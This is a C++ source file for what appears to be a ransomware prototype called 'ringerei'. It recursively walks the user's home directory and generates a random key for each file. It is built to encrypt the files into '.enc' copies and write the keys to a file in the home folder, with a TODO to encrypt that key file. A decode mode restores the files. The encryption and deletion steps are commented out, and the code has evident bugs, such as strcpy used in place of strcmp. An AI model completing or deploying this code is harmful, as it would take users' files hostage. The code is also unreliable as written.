#include <osrng.h>
#include <QDir>
#include <QFile>
#include <ring.hpp>

void encodeDir(QDir& dir, QFile& pwFile);
bool encodeFile(QFile& file, QFile& pwFile);
void encodeHome();
void decodeHome();

unsigned int FILES = 0;
unsigned int SUCCESS = 0;

void encodeDir(QDir& dir, QFile& pwFile)
{
	dir.setFilter(QDir::NoDotAndDotDot | QDir::Dirs | QDir::Files);
	QList<QFileInfo> files = dir.entryInfoList();
	for (int i=1; i<files.length(); i++)
	{
		QFileInfo file = files.at(i);
		if (file.isFile() && file.isReadable() && !file.absoluteFilePath().endsWith(".enc") && !file.absoluteFilePath().endsWith("ringerei.pw"))
		{
			QFile fil(file.absoluteFilePath());
			encodeFile(fil, pwFile);
		}
		else if (file.isDir() && file.isReadable())
		{
			QDir dir(file.absoluteFilePath());
			encodeDir(dir, pwFile);
		}
	}
}

bool encodeFile(QFile& file, QFile& pwFile)
{
	FILES++;
	QFile out(QFileInfo(file).absoluteFilePath()+".enc");
	if (out.exists())
	{
		return false;
	}
	char* pw[256];
//	char* salt[1024];
	CryptoPP::AutoSeededRandomPool rng;
	rng.GenerateBlock((byte*)pw, 256);
//	rng.GenerateBlock((byte*)salt, 1024);
/*	if !(out.open(QIODevice::WriteOnly))
	{
		return false;
	}
	if (out.write((const char*)salt, 1024) != 1024)
	{
		out.close();
		out.remove();
		return false;
	}
	Ring ring((const unsigned char*)pw, 256, (const unsigned char*)salt, 1024, 16);
	unsigned int treated = 0;
	char buf[1024];
	if (!file.open(QIODevice::ReadOnly))
	{
		out.close();
		out.remove();
		return false;
	}
	while (treated < file.size())
	{
		unsigned int readSize = 1024;
		if (treated+readSize >= file.size())
		{
			readSize = file.size()-treated;
		}
		if (file.read(buf, readSize) != readSize)
		{
			out.close();
			out.remove();
			file.close();
			return false;
		}
		ring.encode((unsigned char*)buf, readSize);
		if (out.write(buf, readSize) != readSize)
		{
			out.close();
			out.remove();
			file.close();
			return false;
		}
		treated += readSize;
	}
	file.close();
	out.close();*/
	if (pwFile.write(QFileInfo(out).absoluteFilePath().toStdString().c_str()) != QFileInfo(out).absoluteFilePath().length())
	{
		return false;
	}
	char newline = '\n';
	if (pwFile.write(&newline, 1) != 1)
	{
		return false;
	}
	if (pwFile.write((const char*)pw, 256) != 256)
	{
		return false;
	}
	if (pwFile.write(&newline, 1) != 1)
	{
		return false;
	}
	if (!pwFile.flush())
	{
		return false;
	}
	/*if (!file.remove())
	{
		return false;
	}*/
	SUCCESS++;
	return true;
}

void encodeHome()
{
	QFile pwFile(QDir::homePath() + QDir::separator() + "ringerei.pw");
assert(!pwFile.exists());
	pwFile.open(QIODevice::WriteOnly);
	QDir dir = QDir::home();
	encodeDir(dir, pwFile);
	pwFile.close();
//TODO encode pwFile
}

bool decodeFile(QFile& in, QFile& out, Ring* ring)
{
	unsigned int treated = 1024;
	while (treated < in.size())
	{
		unsigned int readSize = 1024;
		if (treated+readSize >= in.size())
		{
			readSize = in.size()-treated;
		}
		char buf[readSize];
		if (in.read(buf, readSize) != readSize)
		{
			return false;
		}
		ring->decode((unsigned char*)buf, readSize);
		if (out.write(buf, readSize) != readSize)
		{
			return false;
		}
		treated += readSize;
	}
	SUCCESS++;
	return true;
}

void decodeHome()
{
	QFile pwFile(QDir::homePath() + QDir::separator() + "ringerei.pw.enc");
assert(pwFile.exists());
	if (!pwFile.open(QIODevice::ReadOnly))
	{
		return;
	}
//TODO decode pwFile
	unsigned int treated = 0;
	while (treated < pwFile.size())
	{
		FILES++;
		char filename[1024];
		char outfilename[1024];
		int ret = pwFile.readLine(filename, 1024);
		if (ret == -1)
		{
			continue;
		}
		treated += ret;
		strcpy(outfilename, filename);
		outfilename[strlen(outfilename)-3] = '\0';
		treated += pwFile.seek(pwFile.pos()+1);
		char pw[256];
		ret = pwFile.read(pw, 256);
		if (ret != 256)
		{
			continue;
		}
		treated += ret;
		treated += pwFile.seek(pwFile.pos()+1);
		QFile in(filename);
		if (!in.open(QIODevice::ReadOnly))
		{
			continue;
		}
		char salt[1024];
		unsigned int inTreated = 0;
		inTreated += in.read(salt, 1024);
		if (inTreated != 1024)
		{
			in.close();
			continue;
		}
		QFile out(filename);
		if (!out.open(QIODevice::WriteOnly))
		{
			in.close();
			continue;
		}
		Ring ring((const unsigned char*)pw, 256, (const unsigned char*)salt, 1024, 16);
		if (!decodeFile(in, out, &ring))
		{
			in.close();
			out.close();
			out.remove();
			continue;
		}
		in.close();
		out.close();
		in.remove();
	}
	pwFile.close();
	pwFile.remove();
}

int main(int argc, char* argv[])
{
	if (argc > 2)
	{
		printf("%s [-e|-d]\n", argv[0]);
		return -1;
	}
	bool encode = false;
	bool decode = false;
	for (int i=1; i<argc; i++)
	{
		if (strcpy(argv[i], "-d") == 0)
		{
			decode = true;
		}
		if (strcpy(argv[i], "-e") == 0)
		{
			encode = true;
		}
	}
	if (!encode && !decode)
	{
		if (argc == 1)
		{
			encode = true;
		}
		else
		{
			printf("%s [-e|-d]\n", argv[0]);
			return -1;
		}
	}
	if (encode)
	{
		encodeHome();
	}
	if (decode)
	{
		decodeHome();
	}
	printf("%u / %u\n", SUCCESS, FILES);
	return 0;
}
